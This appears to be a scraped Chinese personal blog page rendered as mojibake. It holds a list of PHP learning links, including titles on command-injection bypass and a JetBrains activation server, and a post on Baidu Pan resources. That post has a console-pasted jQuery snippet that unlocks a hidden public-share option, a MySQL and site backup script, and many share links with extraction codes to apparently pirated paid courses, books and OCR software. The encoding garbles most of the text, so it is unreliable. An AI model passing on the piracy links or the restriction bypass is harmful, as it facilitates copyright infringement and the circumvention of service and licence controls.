<p><a href="https://learnku.com/articles/28114" target="_blank" rel="noopener">ç”¨ PHP å†™ä¸€ä¸ªå¾®æ³¢ç‚‰</a></p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Laravel å¼€å‘çš„ä¸€æ¬¾æ–‡æ¡£ç®¡ç†ç³»ç»Ÿ</a></p>
<p><a href="https://learnku.com/articles/30178" target="_blank" rel="noopener">PHP å¼€å‘é‡åŒ–äº¤æ˜“çš„å·¥å…·ï¼Œæ¨¡æ‹Ÿäº¤æ˜“æ‰€ API æ•°æ®</a></p>
<p><a href="https://www.cnblogs.com/zyf-zhaoyafei/p/6928149.html" target="_blank" rel="noopener">å†è°ˆPHPé”™è¯¯ä¸å¼‚å¸¸å¤„ç†</a></p>
<p><a href="https://learnku.com/articles/30049" target="_blank" rel="noopener">MemCached ç¼–è¯‘å®‰è£…éƒ¨ç½²</a></p>
<p><a href="https://learnku.com/articles/30032" target="_blank" rel="noopener">TCP çš„è¿æ¥å»ºç«‹ä¸å…³é—­çŠ¶æ€åŠæ•°æ®ä¼ è¾“é€šä¿¡è¿‡ç¨‹</a></p>
<p><a href="">PhpSpreadsheet å°æ•™ç¨‹https://github.com/PHPOffice/PhpSpreadsheet</a></p>
<p><a href="https://learnku.com/articles/30051" target="_blank" rel="noopener">ç†è§£ cookieã€sessionã€token</a></p>
<p><a href="https://learnku.com/articles/29160" target="_blank" rel="noopener">å¦‚ä½•å¿«é€Ÿæ¥å…¥ GitHub ç™»é™†</a></p>
<p><a href="https://github.com/stabunkow/china-stock-data" target="_blank" rel="noopener">è·å–å›½å†…è´¢ç»é—¨æˆ·ç½‘è‚¡ç¥¨æ•°æ®composeråŒ…https://learnku.com/laravel/t/30040</a></p>
<p><a href="https://learnku.com/articles/30034" target="_blank" rel="noopener">é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§</a></p>
<p><a href="https://learnku.com/articles/29920" target="_blank" rel="noopener">PHP ç»å…¸é¢è¯•é—®é¢˜è§£å†³è¿‡ç¨‹ï¼šä¸Šå°é˜¶é—®é¢˜</a></p>
<p><a href="https://learnku.com/articles/29967" target="_blank" rel="noopener">Tidewaysã€xhprof å’Œ xhgui æ‰“é€  PHP éä¾µå…¥å¼ç›‘æ§å¹³å°</a></p>
<p><a href="https://github.com/jc91715/oc-plugin-book" target="_blank" rel="noopener">æ–‡æ¡£åä½œç¿»è¯‘æ’ä»¶</a></p>
<p><a href="https://learnku.com/articles/29808" target="_blank" rel="noopener"> Slim æ¡†æ¶ä½¿ç”¨orm</a></p>
<p><a href="https://learnku.com/php/t/28934" target="_blank" rel="noopener">PHP åŸºç¡€ç®—é¢˜ä¹‹åŠ¨æ€è§„åˆ’leetcode</a></p>
<p><a href="https://learnku.com/articles/25760#replies" target="_blank" rel="noopener"> PC ç«¯å¾®ä¿¡æ‰«ç æ”¯ä»˜å…¨è¿‡ç¨‹ â€” easywechat + Laravel 5.8</a></p>
<p><a href="https://free-andy.github.io/php-dict/" target="_blank" rel="noopener">phpå‡½æ•°åˆ—è¡¨</a></p>
<p><a href="https://learnku.com/php/t/28922" target="_blank" rel="noopener">PHP é¢å‘å¯¹è±¡è®¾è®¡çš„äº”ä¸ªåŸºå‡†åŸåˆ™</a></p>
<p><a href="https://learnku.com/articles/26995" target="_blank" rel="noopener">æ‰«äºŒç»´ç ç™»å½•è¿‡ç¨‹</a></p>
<p><a href="https://learnku.com/php/t/26050" target="_blank" rel="noopener">ä½¿ç”¨ TUS åè®®æ¥å®ç°å¤§æ–‡ä»¶çš„æ–­ç‚¹ç»­ä¼ </a></p>
<p><a href="https://github.com/terrylinooo/shieldon" target="_blank" rel="noopener">é˜²çˆ¬è™«æœºå™¨äººç›—æ–‡</a></p>
<p><a href="https://zhaobugs.com/2018/12/04/Nginx%E4%B9%8B%E6%97%85-%E7%8E%AF%E5%A2%83%E7%A1%AE%E8%AE%A4%E5%8F%8ANginx%E7%9A%84%E5%AE%89%E8%A3%85/" target="_blank" rel="noopener">Nginxä¹‹æ—…-ç¯å¢ƒç¡®è®¤åŠNginxçš„å®‰è£…</a></p>
<p><a href="https://github.com/aoxiang594/laravel-province-city-area" target="_blank" rel="noopener">çœå¸‚å¿æ•°æ®æ‰©å±•åŒ…</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜</a></p>
<p><a href="https://wi1dcard.cn/posts/phpbrew-documention/" target="_blank" rel="noopener">å¤šç‰ˆæœ¬ PHP å…±å­˜phpbrew</a></p>
<p><a href="https://github.com/wi1dcard/thumb-php" target="_blank" rel="noopener">å•æ–‡ä»¶ PHP ç¼©ç•¥å›¾åº“</a></p>
<p><a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿</a></p>
<p><a href="https://coffeephp.com/" target="_blank" rel="noopener">PHPè®ºå›</a></p>
<p><a href="http://blog.lanyus.com/archives/317.html" target="_blank" rel="noopener">æ­å»ºjetbrainsæ¿€æ´»æœåŠ¡å™¨</a></p>
<p><a href="https://iluoy.com/articles/87" target="_blank" rel="noopener">phpstormçš„å¥‡æŠ€æ·«å·§http://phpstorm.tips/tips</a></p>
<p><a href="http://www.phppan.com/php-design-pattern/" target="_blank" rel="noopener">PHPè®¾è®¡æ¨¡å¼</a></p>
<p><a href="https://www.kancloud.cn/martist/ma_zhao_liu/376759" target="_blank" rel="noopener">å¼€å‘è€…çŸ¥è¯†ä½“ç³»</a></p>
<p><a href="https://learnku.com/articles/10885/full-use-of-jwt" target="_blank" rel="noopener">JWT å®Œæ•´ä½¿ç”¨è¯¦è§£</a></p>
<p><a href="http://www.edbiji.com/doccenter/showdoc/4/nav/678.html" target="_blank" rel="noopener">PHPç¬”è®°</a></p>
<p><a href="https://www.restran.net/2016/09/26/php-security-notes/" target="_blank" rel="noopener">CTF ä¸­çš„ PHP çŸ¥è¯†æ±‡æ€»</a></p>
<p><a href="https://yq.aliyun.com/articles/699892?spm=a2c4e.11153959.0.0.1a265ee3ENEDVQ" target="_blank" rel="noopener">èŠèŠæœåŠ¡ç¨³å®šæ€§ä¿éšœè¿™äº›äº‹</a></p>
<p><a href="https://www.paycats.cn/" target="_blank" rel="noopener">ä¸ªäººå¼€å‘è€…åœ¨çº¿æ”¶æ¬¾çš„æœåŠ¡</a></p>
<p><a href="https://learnku.com/articles/19465" target="_blank" rel="noopener">åŠ å¯†è´§å¸å¸‚åœºå®æ—¶ä»·æ ¼è„šæœ¬</a></p>
<p><a href="https://github.com/chrismaltby/gb-studio" target="_blank" rel="noopener">GameBoyå¼€å‘</a></p>
<p><a href="https://github.com/Danack/Imagick-demos" target="_blank" rel="noopener">An example of all the Imagick functions</a></p>
<p><a href="https://www.jishuwen.com/d/2NGy#tuit" target="_blank" rel="noopener">é™æ€æ‰«æä¸ºä½ çš„PHPé¡¹ç›®ä¸Šçº¿ä¿é©¾æŠ¤èˆª</a></p>
<p><a href="https://www.slidestalk.com/s/code_static_analysis" target="_blank" rel="noopener">é™æ€æ‰«æä¸ºä½ çš„PHPé¡¹ç›®ä¸Šçº¿ä¿é©¾æŠ¤èˆª</a></p>
<p><a href="https://yq.aliyun.com/teams/405/type_blog?spm=a2c4e.11153940.0.0.355e573f6aNW7x" target="_blank" rel="noopener">PHPæŠ€æœ¯è¿›é˜¶</a></p>
<p><a href="https://learnku.com/php/t/27412" target="_blank" rel="noopener">2019 PHP å®‰å…¨æŒ‡å—</a></p>
<p><a href="https://laravel-china.github.io/php-the-right-way/" target="_blank" rel="noopener">phpä¹‹é“</a></p>
<p><a href="https://www.boatsky.com/blog/53" target="_blank" rel="noopener">2æ ¸1Gå†…å­˜çš„æœåŠ¡å™¨èƒ½æ‰¿è½½å¤šå°‘äººè®¿é—®</a></p>
<p><a href="https://www.boatsky.com/blog/26" target="_blank" rel="noopener">æ·±å…¥ç†è§£IEEE754çš„64ä½åŒç²¾åº¦</a></p>
<p><a href="https://andongshen.com/2019/04/21/webhooks-php/" target="_blank" rel="noopener">è‡ªåŠ¨æ‹‰å–githubä¸Šçš„ä»“åº“</a></p>
<p><a href="https://github.com/mingyoung/dingtalk" target="_blank" rel="noopener">EasyDingTalk</a></p>
<p><a href="https://github.com/icecho/leetcode" target="_blank" rel="noopener">å°è¯• leetcode é¢˜ç›®</a></p>
<p><a href="https://www.qingwei.tech/programe-develops/php/622.html" target="_blank" rel="noopener">PHPå¸¸ç”¨å‡½æ•°æ•´ç†</a></p>
<p><a href="https://github.com/alicfeng/note.samego.com" target="_blank" rel="noopener">ç¬”è®°åˆ†äº« | ç®€ä¹¦2GitHub</a></p>
<p><a href="https://github.com/dedemao/weixinPay" target="_blank" rel="noopener">å¾®ä¿¡æ”¯ä»˜å•æ–‡ä»¶ç‰ˆ</a></p>
<p><a href="https://learnku.com/articles/28256" target="_blank" rel="noopener">æ— é™çº§åˆ†ç±»ã€å¤šçº§èœå•ã€çœä»½åŸå¸‚</a></p>
<p><a href="https://www.fanhaobai.com/2018/09/process-php-multiprocess-server.html" target="_blank" rel="noopener">ç”¨PHPç©è½¬è¿›ç¨‹ä¹‹äºŒ â€” å¤šè¿›ç¨‹PHPServer</a></p>
<p><a href="https://gitee.com/zmzmzm/unid" target="_blank" rel="noopener">unidæ˜¯ä¸€ä¸ªå¯ä»¥ç”Ÿæˆå”¯ä¸€IDçš„phpæ‰©å±•</a></p>
<p><a href="https://learnku.com/articles/28245#topnav" target="_blank" rel="noopener">ç§’æ€ç³»ç»Ÿçš„è®¾è®¡</a></p>
<p><a href="https://spacevim.org/cn/use-vim-as-a-php-ide/" target="_blank" rel="noopener">ä½¿ç”¨ Vim æ­å»º PHP å¼€å‘ç¯å¢ƒ</a></p>
<p><a href="https://github.com/free-andy/docker-dev" target="_blank" rel="noopener">docker æ„å»º php å¼€å‘ç¯å¢ƒ</a></p>
<p><a href="https://github.com/maximebf/php-debugbar" target="_blank" rel="noopener">Debug bar for PHP</a></p>
<p><a href="https://github.com/FireLustre/php-dfa-sensitive" target="_blank" rel="noopener">è¿‡æ»¤æ•æ„Ÿè¯æ±‡</a></p>
<p><a href="https://shuwoom.com/?p=3151" target="_blank" rel="noopener">COOKIEå’ŒSESSIONæœºåˆ¶è¯¦è§£</a></p>
<p><a href="https://www.njphper.com/posts/210095c.html" target="_blank" rel="noopener">webupload å®ç°åˆ†ç‰‡ä¸Šä¼ è§†é¢‘</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/09/ç™¾åº¦ç½‘ç›˜èµ„æº/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/09/ç™¾åº¦ç½‘ç›˜èµ„æº/" itemprop="url">ç™¾åº¦ç½‘ç›˜èµ„æº</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-09T19:24:41+08:00">
                2019-05-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1.5k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  6 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="å…¬å¼€åˆ†äº«"><a href="#å…¬å¼€åˆ†äº«" class="headerlink" title="å…¬å¼€åˆ†äº«"></a>å…¬å¼€åˆ†äº«</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç™¾åº¦ç½‘ç›˜ â€“ é€‰æ‹©æ–‡ä»¶åˆ†äº« â€“ åˆ†äº«æ¡†å¼¹å‡º â€“ æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·è¿›å…¥æ§åˆ¶å°ï¼ˆæŒ‰F12 æˆ–è€…å³é”®æ‰“å¼€ï¼‰ â€“ ç²˜è´´ä»¥ä¸‹ä»£ç ï¼</span><br><span class="line">$(<span class="string">".share-method-line"</span>).parent().append(<span class="string">'&lt;div class="share-method-line"&gt;&lt;input type="radio" id="share-method-public" name="share-method" value="public" checked=""&gt;&lt;span class="icon radio-icon icon-radio-non"&gt;&lt;/span&gt;&lt;label for="share-method-public"&gt;&lt;b&gt;å…¬å¼€åˆ†äº«&lt;/b&gt;&lt;span&gt;æ— éœ€æå–ç ,ä»»ä½•äººéƒ½å¯ç›´æ¥è®¿é—®ä¸‹è½½ï¼&lt;/span&gt; &lt;/label&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ç™¾åº¦ç½‘ç›˜å¤‡ä»½"><a href="#ç™¾åº¦ç½‘ç›˜å¤‡ä»½" class="headerlink" title="ç™¾åº¦ç½‘ç›˜å¤‡ä»½"></a>ç™¾åº¦ç½‘ç›˜å¤‡ä»½</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/houtianze/bypy</span></span><br><span class="line">sudo pip install requests</span><br><span class="line"></span><br><span class="line">git clone https:<span class="comment">//github.com/houtianze/bypy.git</span></span><br><span class="line">./bypy.py info</span><br><span class="line">./bypy.py upload ./requirements.txt test/requirements.txt</span><br><span class="line">vim backup.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SCRIPT_DIR="/root" #è¿™ä¸ªæ”¹æˆä½ å­˜æ”¾åˆšåˆšä¸‹è½½ä¸‹æ¥çš„bypyçš„æ–‡ä»¶å¤¹ä½ç½®</span><br><span class="line">DROPBOX_DIR="/backup" #è¿™ä¸ªæ”¹æˆä½ çš„å¤‡ä»½æ–‡ä»¶æƒ³è¦æ”¾åœ¨ç™¾åº¦ç½‘ç›˜ä¸‹é¢çš„æ–‡ä»¶å¤¹åç§°ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œè„šæœ¬ä¼šè‡ªåŠ¨åˆ›å»º</span><br><span class="line">BACKUP_SRC="/home/wwwroot /usr/local/nginx/conf" #è¿™ä¸ªæ˜¯ä½ æƒ³è¦å¤‡ä»½çš„æœ¬åœ°VPSä¸Šçš„æ–‡ä»¶ï¼Œä¸åŒçš„ç›®å½•ç”¨ç©ºæ ¼åˆ†å¼€</span><br><span class="line">BACKUP_DST="/tmp" #è¿™ä¸ªæ˜¯ä½ æš‚æ—¶å­˜æ”¾å¤‡ä»½å‹ç¼©æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¸€èˆ¬ç”¨/tmpå³å¯</span><br><span class="line">MYSQL_SERVER="localhost" #è¿™ä¸ªæ˜¯ä½ mysqlæœåŠ¡å™¨çš„åœ°å€ï¼Œä¸€èˆ¬å¡«è¿™ä¸ªæœ¬åœ°åœ°å€å³å¯</span><br><span class="line">MYSQL_USER="mysqluser" #è¿™ä¸ªæ˜¯ä½ mysqlçš„ç”¨æˆ·ååç§°ï¼Œæ¯”å¦‚rootæˆ–adminä¹‹ç±»çš„</span><br><span class="line">MYSQL_PASS="password" #è¿™ä¸ªæ˜¯ä½ mysqlç”¨æˆ·çš„å¯†ç </span><br><span class="line"># ä¸‹é¢çš„ä¸€èˆ¬ä¸ç”¨æ”¹äº†</span><br><span class="line">NOW=$(date +<span class="string">"%Y.%m.%d"</span>)</span><br><span class="line">DESTFILE=<span class="string">"$BACKUP_DST/$NOW.tar.gz"</span></span><br><span class="line"># å¤‡ä»½mysqlæ•°æ®åº“å¹¶å’Œå…¶å®ƒå¤‡ä»½æ–‡ä»¶ä¸€èµ·å‹ç¼©æˆä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">mysqldump -u $MYSQL_USER -h $MYSQL_SERVER -p$MYSQL_PASS --all-databases &gt; <span class="string">"$NOW-Databases.sql"</span></span><br><span class="line">echo <span class="string">"æ•°æ®åº“å¤‡ä»½å®Œæˆï¼Œæ‰“åŒ…ç½‘ç«™æ•°æ®ä¸­..."</span></span><br><span class="line">tar cfzP <span class="string">"$DESTFILE"</span> $BACKUP_SRC <span class="string">"$NOW-Databases.sql"</span></span><br><span class="line">echo <span class="string">"æ‰€æœ‰æ•°æ®æ‰“åŒ…å®Œæˆï¼Œå‡†å¤‡ä¸Šä¼ ..."</span></span><br><span class="line"># ç”¨è„šæœ¬ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜</span><br><span class="line">$SCRIPT_DIR/bypy/bypy.py upload <span class="string">"$DESTFILE"</span> <span class="string">"$DROPBOX_DIR/$NOW.tar.gz"</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq <span class="number">0</span> ];then</span><br><span class="line">     echo <span class="string">"ä¸Šä¼ å®Œæˆ"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">     echo <span class="string">"ä¸Šä¼ å¤±è´¥ï¼Œé‡æ–°å°è¯•"</span></span><br><span class="line">fi</span><br><span class="line"># åˆ é™¤æœ¬åœ°çš„ä¸´æ—¶æ–‡ä»¶</span><br><span class="line">rm -f <span class="string">"$NOW-Databases.sql"</span> <span class="string">"$DESTFILE"</span></span><br><span class="line">ç„¶åæ”¹ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼š</span><br><span class="line">chmod +x backup.sh #èµ‹äºˆæƒé™</span><br><span class="line">è¿è¡Œçš„æ—¶å€™å°±è¾“å…¥ä¸‹é¢çš„ä»£ç å³å¯ï¼š</span><br><span class="line">./backup.sh</span><br><span class="line">ç„¶åé€šè¿‡ cron æ¥è®¾ç½®å®šæ—¶è¿è¡Œè„šæœ¬ï¼š</span><br><span class="line">crontab -e</span><br><span class="line">åŠ å…¥ä»¥ä¸‹ä»£ç ï¼Œ:wq ä¿å­˜</span><br><span class="line"><span class="number">0</span> <span class="number">5</span> * * * <span class="regexp">/bin/</span>bash /root/backup.sh</span><br><span class="line">https:<span class="comment">//blog.fazero.me/2016/10/13/backup-vps-to-by/</span></span><br></pre></td></tr></table></figure>
<p>è‡³å°Šæœç´¢ç¥å™¨</p>
<p>ç™¾åº¦ç½‘ç›˜ä¸‹è½½é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/18f2uN4i-HmxcePwkM0W0gA" target="_blank" rel="noopener">https://pan.baidu.com/s/18f2uN4i-HmxcePwkM0W0gA</a> æå–ç ï¼štjvd </p>
<p>è“å¥äº‘ä¸‹è½½é“¾æ¥ <a href="https://www.lanzous.com/i4ernha" target="_blank" rel="noopener">https://www.lanzous.com/i4ernha</a></p>
<p><a href="https://pan.baidu.com/share/init?surl=ZZSLs9wmqkKmdTXlskMKdA" target="_blank" rel="noopener">æ–‡æ¡ˆå†™ä½œ å¯†ç b50k</a></p>
<p><a href="https://pan.baidu.com/s/1AxvDnEd0SGliwrckc4yJkA" target="_blank" rel="noopener">å¼ å°é¾™é¥­å¦ç”µå­ä¹¦ å¯†ç 07wb</a></p>
<p><a href="https://pan.baidu.com/s/1FpneAwcGyCnlpOIuagHlug" target="_blank" rel="noopener">æ•ˆç‡å·¥å…· å¯†ç 2b5y</a></p>
<p><a href="https://pan.baidu.com/s/1PClifEIeuLqnBtx2OGVCVQ" target="_blank" rel="noopener">ä¸€é”®ä¸‹è½½ç½‘é¡µå›¾ç‰‡æ’ä»¶ å¯†ç 7haa</a></p>
<p><a href="https://pan.baidu.com/s/1R38ldHhmCCivTrGCcBP4uA" target="_blank" rel="noopener">å…¬ä¼—å·æ’ç‰ˆ å¯†ç 5058</a></p>
<p><a href="https://pan.baidu.com/wap/init?surl=BkjhJPr2ZuAJla-A_I85LQ&amp;adapt=pc&amp;fr=ftw" target="_blank" rel="noopener">ç¼–ç¨‹èµ„æº å¯†ç wanr</a></p>
<p><a href="https://pan.baidu.com/s/1yQ9dJyzSVh6nBxL_Y4yQUQ" target="_blank" rel="noopener">å…¬ä¼—å·è°­æŸäººæŠ€æœ¯åˆ†äº«</a></p>
<p><a href="http://www.pipiys.xyz/" target="_blank" rel="noopener">ç”µå½±</a></p>
<p><a href="https://wn.run/cn/" target="_blank" rel="noopener">ä¸‡èƒ½å‘½ä»¤å·¥å…·</a></p>
<p><a href="https://github.com/peterq/pan-light" target="_blank" rel="noopener">ä¸é™é€Ÿçš„ç™¾åº¦ç½‘ç›˜å®¢æˆ·ç«¯</a></p>
<p> <a href="https://shimo.im/docs/AMVhpDJ4NJYMsktr/read" target="_blank" rel="noopener">å½±è§†å‰§</a></p>
<p> <a href="http://www.coupling.pw/77320/06/21.LjLXXH" target="_blank" rel="noopener">é“¶æ²³è¡¥ä¹ ç­ç”µå½±</a><br>ABBYYFineReader æ˜¯ä¸€æ¬¾OCRå›¾ç‰‡æ–‡å­—è¯†åˆ«è½¯ä»¶ï¼Œå¯ä»¥å¿«é€Ÿã€æ–¹ä¾¿åœ°å°†æ‰«æçº¸è´¨æ–‡ä»¶ã€PDFæ ¼å¼åŠæ•°å­—æˆ–ç§»åŠ¨ç”µè¯å›¾åƒè½¬æ¢æˆå¯ç¼–è¾‘æ ¼å¼â€”â€”Microsoftã€ Wordã€Excelã€PowerPointã€PDFã€HTMLç­‰ã€‚99.8%çš„è¯†åˆ«å‡†ç¡®ç‡å³åˆ»è¯†åˆ«æ–‡æœ¬ï¼Œå¤åˆ¶å’Œç²˜è´´ï¼Œæœç´¢æˆ–ç¼–è¾‘ã€‚è½»æ¾æ‰«æçº¸è´¨æ–‡ä»¶æˆ–PDFè½¬æ¢ä¸ºå¯ç¼–è¾‘æ–‡æœ¬ï¼Œæ”¯æŒå¤šå›½è¯­è¨€ï¼Œä¿ç•™åŸæ¥çš„å¸ƒå±€å’Œæ ¼å¼ã€‚<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1TUrmsaqiJrySbmr6IGBIsQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1TUrmsaqiJrySbmr6IGBIsQ</a> æå–ç : 78zv  </p>
<p>æ–°åª’ä½“è¿è¥å¹²è´§ï¼Œè‡ªåª’ä½“ï¼Œå„è¡Œä¸šç ”ç©¶æŠ¥å‘Šï¼Œ è¶…å¤šèµ„æ–™</p>
<p>æ–°åª’ä½“è¿è¥å¹²è´§<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1gNyK8LdhXtWg0cO7RxE9nQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gNyK8LdhXtWg0cO7RxE9nQ</a> å¯†ç :p3w4</p>
<p>æ–°åª’ä½“è¯¾å ‚<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1E5ctTySIrmc_RTglnHao3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1E5ctTySIrmc_RTglnHao3Q</a> å¯†ç :ahp3<br>æ–°åª’ä½“è¯¾å ‚æ’ç‰ˆä¸æ–‡æ¡ˆ<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1qzfVeBk2Yz-h4uKe_bIHgA" target="_blank" rel="noopener">https://pan.baidu.com/s/1qzfVeBk2Yz-h4uKe_bIHgA</a> å¯†ç :nix9<br>æ–°åª’ä½“è¥é”€æŠ€å·§ï¼Œæ¶¨ç²‰<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1etOhGHAYc0hYPAqDUcTMnw" target="_blank" rel="noopener">https://pan.baidu.com/s/1etOhGHAYc0hYPAqDUcTMnw</a> å¯†ç :qyl1<br>6000ä»½è¥é”€ç­–åˆ’èµ„æ–™<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1Heybav_FPXAbZX3hgHpR0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1Heybav_FPXAbZX3hgHpR0A</a> å¯†ç :7gcy<br>pptæ¨¡æ¿<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1FVtJ08BSwtftgfkSzC5EXA" target="_blank" rel="noopener">https://pan.baidu.com/s/1FVtJ08BSwtftgfkSzC5EXA</a> å¯†ç :rfxc<br>å„è¡Œä¸šå•†ä¸šè®¡åˆ’ä¹¦<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1IYsUS0niz-BsO3XAUtl6lA" target="_blank" rel="noopener">https://pan.baidu.com/s/1IYsUS0niz-BsO3XAUtl6lA</a> å¯†ç :g7n8<br>31å¥—äº’è”ç½‘å•†ä¸šåˆ›ä¸šè®¡åˆ’ä¹¦<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1huRn7UmbaHmVteNxW5hYgQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1huRn7UmbaHmVteNxW5hYgQ</a> å¯†ç :gn80<br>å¸ˆåŒ—è¾°å†™ä½œè¯¾<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1YJZ8CpF0uq7y3dycRjaUPg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YJZ8CpF0uq7y3dycRjaUPg</a> å¯†ç :ner0</p>
<p>170ä¸ªçŸ¥ä¹liveä»˜è´¹è¯¾ç¨‹<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1v3tfTXsxrppJFZbZZIwtxA" target="_blank" rel="noopener">https://pan.baidu.com/s/1v3tfTXsxrppJFZbZZIwtxA</a> å¯†ç :5ujb<br>å¹¿å‘Šäººçš„ä¹¦åº—<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1fULLIBk1UV8xTMe6yFnIgw" target="_blank" rel="noopener">https://pan.baidu.com/s/1fULLIBk1UV8xTMe6yFnIgw</a> å¯†ç :q9pl<br>å‡ ç™¾æœ¬ä¹¦<br>é“¾æ¥:<a href="https://pan.baidu.com/s/1u3widW7MYdPkAVSCcRevXQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u3widW7MYdPkAVSCcRevXQ</a> å¯†ç :g5il<br>ç¬”è¯•èµ„æ–™é“¾æ¥: <a href="https://pan.baidu.com/s/1L0gVd620Lny_JNsx4smPCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1L0gVd620Lny_JNsx4smPCw</a> æå–ç : gwwf  </p>
<p>Pythonæ•°æ®åˆ†æä¸æœºå™¨å­¦ä¹ å®æˆ˜èµ„æ–™<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1gPLYDra0nsGPj0dia0RzSg" target="_blank" rel="noopener">https://pan.baidu.com/s/1gPLYDra0nsGPj0dia0RzSg</a><br>æå–ç ï¼š18l6</p>
<p>è¿˜æ˜¯åˆ†äº«è¯¾ç¨‹å§ pythonäººå·¥æ™ºèƒ½  é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1Z5ctN75EHqPUHLXOYrs6Tw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Z5ctN75EHqPUHLXOYrs6Tw</a><br>æå–ç ï¼šjpil</p>
<p>1-1ã€ä»·å€¼2980å…ƒè‡ªåª’ä½“å†…éƒ¨åŸ¹è®­çè´µè§†é¢‘æ•™ç¨‹<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1fPyJcwO89c1VQ5KBN7GcWA" target="_blank" rel="noopener">https://pan.baidu.com/s/1fPyJcwO89c1VQ5KBN7GcWA</a><br>æå–ç ï¼šikd6 </p>
